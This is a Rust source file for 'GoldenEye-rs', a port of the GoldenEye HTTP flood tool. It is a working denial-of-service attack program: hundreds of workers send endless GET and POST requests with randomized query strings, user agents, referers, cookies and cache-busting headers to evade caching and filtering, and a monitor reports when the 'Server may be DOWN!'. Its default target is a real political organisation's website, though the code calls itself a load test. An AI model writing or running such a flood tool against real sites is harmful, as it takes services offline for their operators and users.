use clap::Parser;
use rand::prelude::*;
use rand::{Rng, SeedableRng};
use rand_chacha::ChaCha8Rng; // or ChaCha20Rng/StdRng
use reqwest::header::{HeaderMap, HeaderName, HeaderValue, CONNECTION, HOST, USER_AGENT};
use std::collections::VecDeque;
use std::io::{BufRead, BufReader};
use std::sync::{
    atomic::{AtomicBool, AtomicUsize, Ordering},
    Arc,
};
use std::time::Duration;
use tokio::signal;
use tokio::task::JoinHandle;
use tokio::time::sleep;

const DEFAULT_WORKERS: usize = 300;
const DEFAULT_SOCKETS: usize = 5;

const METHOD_GET: &str = "get";
const METHOD_POST: &str = "post";
const METHOD_RAND: &str = "random";
const DEFAULT_WEBSITE: &str = "https://www.project2025.org/";
/// (Similar functionality to the Python GoldenEye script.)
#[derive(Parser, Debug)]
#[command(author, version, about)]
struct Cli {
    /// Target URL (http://... or https://...)
    #[arg(default_value_t = DEFAULT_WEBSITE.to_string())]
    url: String,

    /// Number of concurrent "worker tasks"
    #[arg(short = 'w', long = "workers", default_value_t = DEFAULT_WORKERS)]
    workers: usize,

    /// Number of concurrent requests (connections) per worker
    #[arg(short = 's', long = "sockets", default_value_t = DEFAULT_SOCKETS)]
    sockets: usize,

    /// HTTP method to use: get, post, or random
    #[arg(short = 'm', long = "method", default_value_t = String::from(METHOD_RAND))]
    method: String,

    /// Path to file containing a list of user agent strings
    #[arg(short = 'u', long = "useragents")]
    useragents: Option<String>,

    /// Skip SSL certificate verification
    #[arg(short = 'n', long = "nosslcheck", default_value_t = false)]
    nosslcheck: bool,

    /// Print debug info
    #[arg(short = 'd', long = "debug", default_value_t = false)]
    debug: bool,
}

/// Manages random data generation: strings, query params, user agents, etc.
struct RandomDataGenerator {
    user_agents: Arc<Vec<String>>,
    rng: ChaCha8Rng,
}

impl RandomDataGenerator {
    fn new(user_agents: Arc<Vec<String>>) -> Self {
        // For demonstration, we seed with random data from the OS:
        let seed: [u8; 32] = rand::random();
        let rng = ChaCha8Rng::from_seed(seed);
        Self { user_agents, rng }
    }

    /// Build a random ASCII string of length `size`.
    fn build_block(&mut self, size: usize) -> String {
        const CHARSET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ\
                                 abcdefghijklmnopqrstuvwxyz\
                                 0123456789";

        // We'll pick the range beforehand to avoid multiple borrows of `self.rng`.
        // Then we produce that many chars.
        let mut output = String::with_capacity(size);
        for _ in 0..size {
            let idx = self.rng.gen_range(0..CHARSET.len());
            output.push(CHARSET[idx] as char);
        }
        output
    }

    /// Generate a small random user agent if none are provided.
    fn random_user_agent(&mut self) -> String {
        let os_opts = [
            "Windows NT 10.0; Win64; x64",
            "Macintosh; Intel Mac OS X 10_15_7",
            "X11; Linux x86_64",
        ];
        let br_opts = [
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.77 Safari/537.36",
            "Gecko/20100101 Firefox/109.0",
        ];
        let os_ua = os_opts[self.rng.gen_range(0..os_opts.len())];
        let br_ua = br_opts[self.rng.gen_range(0..br_opts.len())];
        format!("Mozilla/5.0 ({}) {}", os_ua, br_ua)
    }

    /// Return a user agent from the pool or randomly generate it.
    fn get_user_agent(&mut self) -> String {
        if !self.user_agents.is_empty() {
            let idx = self.rng.gen_range(0..self.user_agents.len());
            self.user_agents[idx].clone()
        } else {
            self.random_user_agent()
        }
    }

    /// Generate a query string with random keys/values.
    fn generate_query_string(&mut self, pairs: usize) -> String {
        let mut output = String::new();
        for i in 0..pairs {
            // Precompute sizes to avoid borrowing self.rng multiple times
            let key_size = self.rng.gen_range(3..11);
            let val_size = self.rng.gen_range(3..21);

            let key = self.build_block(key_size);
            let val = self.build_block(val_size);

            output.push_str(&key);
            output.push('=');
            output.push_str(&val);
            if i < pairs - 1 {
                output.push('&');
            }
        }
        output
    }
}

/// Holds shared state for the load test.
struct LoadTestState {
    success_count: AtomicUsize,
    fail_count: AtomicUsize,
    running: AtomicBool,
}

impl LoadTestState {
    fn new() -> Self {
        Self {
            success_count: AtomicUsize::new(0),
            fail_count: AtomicUsize::new(0),
            running: AtomicBool::new(true),
        }
    }
    fn reset(&self){
        self.success_count.store(0, Ordering::Relaxed);
    }
    fn inc_success(&self) {
        self.success_count.fetch_add(1, Ordering::Relaxed);
    }

    fn inc_fail(&self) {
        self.fail_count.fetch_add(1, Ordering::Relaxed);
    }

    fn stop(&self) {
        self.running.store(false, Ordering::SeqCst);
    }

    fn is_running(&self) -> bool {
        self.running.load(Ordering::SeqCst)
    }
}

/// Build random headers for each request.
fn build_headers(data_gen: &mut RandomDataGenerator, host: &str) -> HeaderMap {
    let mut headers = HeaderMap::new();

    let user_agent = data_gen.get_user_agent();
    //     headers.insert(
    //     HeaderName::from_static("x-forwarded-for"),
    //     HeaderValue::from_static("8.8.8.8"),
    // );
    match HeaderValue::from_str(&user_agent) {
        Ok(hv) => {
            headers.insert(USER_AGENT, hv);
  }
        Err(_) => {
            // Fallback if invalid
            headers.insert(USER_AGENT, HeaderValue::from_static("Mozilla/5.0"));
        }
    }

    headers.insert(CONNECTION, HeaderValue::from_static("keep-alive"));

    match HeaderValue::from_str(host) {
        Ok(hv) => {
            headers.insert(HOST, hv);
        }
        Err(_) => {
            headers.insert(HOST, HeaderValue::from_static("invalid.host"));
        }
    }

    // Optional random accept-charset
    if data_gen.rng.gen_bool(0.5) {
        let charset_choices = ["ISO-8859-1", "utf-8", "Windows-1251", "ISO-8859-2"];
        let c1_idx = data_gen.rng.gen_range(0..charset_choices.len());
        let c2_idx = data_gen.rng.gen_range(0..charset_choices.len());
        let c1 = charset_choices[c1_idx];
        let c2 = charset_choices[c2_idx];

        let q1 = data_gen.rng.gen_range(1..10);
        let q2 = data_gen.rng.gen_range(1..10);
        let accept_charset = format!("{},{};q=0.{};*;q=0.{}", c1, c2, q1, q2);

        if let Ok(hv) = HeaderValue::from_str(&accept_charset) {
            headers.insert(HeaderName::from_static("accept-charset"), hv);
        }
    }

    // Optional referer
    if data_gen.rng.gen_bool(0.5) {
        let ref_opts = [
            "http://www.google.com/",
            "http://www.bing.com/",
            "http://www.baidu.com/",
            "http://www.yandex.com/",
            &format!("http://{}/", host),
        ];
        let idx = data_gen.rng.gen_range(0..ref_opts.len());
        let mut referer = ref_opts[idx].to_string();

        if data_gen.rng.gen_bool(0.5) {
            let pairs = data_gen.rng.gen_range(1..6);
            let q = data_gen.generate_query_string(pairs);
            referer.push('?');
            referer.push_str(&q);
        }

        if let Ok(hv) = HeaderValue::from_str(&referer) {
            headers.insert(HeaderName::from_static("referer"), hv);
        }
    }

    // Optional content-type
    if data_gen.rng.gen_bool(0.5) {
        let ct = if data_gen.rng.gen_bool(0.5) {
            "multipart/form-data"
        } else {
            "application/x-url-encoded"
        };
        headers.insert(HeaderName::from_static("content-type"), HeaderValue::from_static(ct));
    }

    // Optional cookie
    if data_gen.rng.gen_bool(0.5) {
        let pairs = data_gen.rng.gen_range(1..6);
        let cookie_str = data_gen.generate_query_string(pairs);
        if let Ok(hv) = HeaderValue::from_str(&cookie_str) {
            headers.insert(HeaderName::from_static("cookie"), hv);
        }
    }

    // Random cache-control
    let cache_opts = ["no-cache", "max-age=0"];
    let n_cache = data_gen.rng.gen_range(1..=cache_opts.len());
    let mut used = VecDeque::from(cache_opts);
    let mut cc_vec = vec![];
    for _ in 0..n_cache {
        if let Some(item) = used.pop_front() {  
            cc_vec.push(item);
        }
    }
    let cache_control = cc_vec.join(", ");

    if let Ok(hv) = HeaderValue::from_str(&cache_control) {
        headers.insert(HeaderName::from_static("cache-control"), hv);
    }

    // Accept-Encoding
    let enc_opts = ["gzip", "deflate", "identity", "*"];
    let mut shuffle_enc = enc_opts.to_vec();
    shuffle_enc.shuffle(&mut data_gen.rng);
    let ecount = data_gen.rng.gen_range(1..=shuffle_enc.len());
    let chosen_enc = &shuffle_enc[0..ecount];
    let accept_encoding = chosen_enc.join(", ");

    if let Ok(hv) = HeaderValue::from_str(&accept_encoding) {
        headers.insert(HeaderName::from_static("accept-encoding"), hv);
    }

    headers
}

/// Each worker spawns multiple "connections" in an infinite loop, making requests.
async fn worker_task(
    client: reqwest::Client,
    url: String,
    sockets: usize,
    method: String,
    state: Arc<LoadTestState>,
    mut data_gen: RandomDataGenerator,
    debug: bool,
) {
    let parsed = match reqwest::Url::parse(&url) {
        Ok(p) => p,
        Err(e) => {
            eprintln!("[!] Invalid URL {url}: {e}");
            return;
        }
    };
    let host = parsed
        .host_str()
        .unwrap_or("localhost")
        .to_string();
    let port = parsed.port_or_known_default().unwrap_or(80);

    while state.is_running() {
        // For each "connection"
        for _ in 0..sockets {
            let chosen_method = if method == METHOD_RAND {
                if data_gen.rng.gen_bool(0.5) {
                    METHOD_GET
                } else {
                    METHOD_POST
                }
            } else {
                &method
            };

            // Build random path with query
            let base_path = parsed.path().trim();
            let joiner = if base_path.contains('?') { '&' } else { '?' };

            let pairs_count = data_gen.rng.gen_range(1..6);
            let q_string = data_gen.generate_query_string(pairs_count);

            // Construct final request URL
            let final_path = if base_path.is_empty() { "/" } else { base_path };
            let req_url = format!(
                "{}://{}:{}{}{}{}",
                parsed.scheme(),
                host,
                port,
                final_path,
                joiner,
                q_string
            );

            // Build random headers
            let headers = build_headers(&mut data_gen, &host);

            let req_builder = match chosen_method {
                METHOD_GET => client.get(&req_url),
                METHOD_POST => client.post(&req_url),
                _ => client.get(&req_url), // fallback
            }
            .headers(headers);

            let result = req_builder.send().await;
            match result {
                Ok(response) => {
                    // Attempt to consume body for completeness (optional)
                    if let Err(e) = response.bytes().await {
                        if debug {
                            eprintln!("[DEBUG] Response body read error: {e}");
                        }
                        state.inc_fail();
                        continue;
                    }
                    state.inc_success();
                }
                Err(e) => {
                    if debug {
                        eprintln!("[DEBUG] Request error: {e}");
                    }
                    state.inc_fail();
                }
            }
        }
    }
}

/// Main monitor that prints stats while tasks run. Stops on Ctrl+C or when tasks finish.
async fn monitor_state(state: Arc<LoadTestState>, debug: bool) {
    let mut last_success = 0;
    let mut last_fail = 0;
    let mut avg = 0.0;
    loop {
        tokio::select! {
            _ = signal::ctrl_c() => {
                eprintln!("\n[!] Caught Ctrl+C, stopping...");
                state.stop();
                break;
            }
            _ = sleep(Duration::from_secs(3)) => {
                let s = state.success_count.load(Ordering::Relaxed);
                let f = state.fail_count.load(Ordering::Relaxed);
                if avg == 0.0 {
                    avg = state.success_count.load(Ordering::Relaxed) as f64
                }
                avg = ((avg + state.success_count.load(Ordering::Relaxed) as f64) / 2.0).floor();

                print!("[+] Hits: {s} | Fails: {f}, Avg: {avg}");
                state.success_count.store(0, Ordering::Relaxed);
                if s > 0 && f > 0 && s == last_success && f > last_fail {
                    print!(" => Server may be DOWN!");
                }
                println!();

                last_success = s;
                last_fail = f;
            }
        }
        if !state.is_running() {
            break;
        }
    }

    // Final stats
    let final_s = state.success_count.load(Ordering::Relaxed);
    let final_f = state.fail_count.load(Ordering::Relaxed);
    println!("[+] Final Hits: {final_s} | Final Fails: {final_f}");
    if debug {
        println!("[DEBUG] Monitor finished.");
    }
}

#[tokio::main]
async fn main() {
    let cli = Cli::parse();
    // Basic banner
    println!("\nGoldenEye-rs - Rust Implementation");
    println!("----------------------------------");

    println!("Target: {}", cli.url);

    println!(
        "Mode: '{}' | Workers: {} | Sockets/Worker: {}",
        cli.method, cli.workers, cli.sockets
    );
    println!("Press Ctrl+C to stop.\n");

    // Load user-agents if provided
    let mut user_agents_vec = Vec::new();
    if let Some(path) = &cli.useragents {
        match std::fs::File::open(path) {
            Ok(file) => {
                let reader = BufReader::new(file);
                for line in reader.lines().flatten() {
                    let trimmed = line.trim().to_string();
                    if !trimmed.is_empty() {
                        user_agents_vec.push(trimmed);
                    }
                }
            }
            Err(e) => {
                eprintln!("[!] Could not read useragents file: {e}");
            }
        }
    }
    let user_agents_arc = Arc::new(user_agents_vec);

    // Build global state
    let state = Arc::new(LoadTestState::new());
    let mut tasks: Vec<JoinHandle<()>> = Vec::new();

    // Build the reqwest client
    let mut client_builder = reqwest::Client::builder();
    if cli.nosslcheck {
        // Danger: Accept invalid certs
        client_builder = client_builder.danger_accept_invalid_certs(true);
    }
    let client = match client_builder.build() {
        Ok(c) => c,
        Err(e) => {
            eprintln!("[!] Failed to build reqwest client: {e}");
            return;
        }
    };

    // Launch workers
    for _ in 0..cli.workers {
        let w_client = client.clone();
        let w_state = Arc::clone(&state);
        let w_url = cli.url.clone();
        let w_method = cli.method.clone();
        let debug = cli.debug;

        // Each worker has its own data generator (with its own RNG).
        let worker_data_gen = RandomDataGenerator::new(Arc::clone(&user_agents_arc));

        let handle = tokio::spawn(async move {
            worker_task(
                w_client,
                w_url,
                cli.sockets,
                w_method,
                w_state,
                worker_data_gen,
                debug
            ).await;
        });
        tasks.push(handle);
    }

    // Monitor stats in a separate task
    let monitor_handle = {
        let st = Arc::clone(&state);
        let dbg = cli.debug;
        tokio::spawn(async move {
            monitor_state(st, dbg).await;
        })
    };

    // Wait for all tasks to finish
    // The monitor task will break on Ctrl+C and call `state.stop()`,
    // eventually letting worker tasks exit their loop
    for t in tasks {
        let _ = t.await;
    }
    let _ = monitor_handle.await;

    println!("\n[+] Exiting GoldenEye-rs.");
}
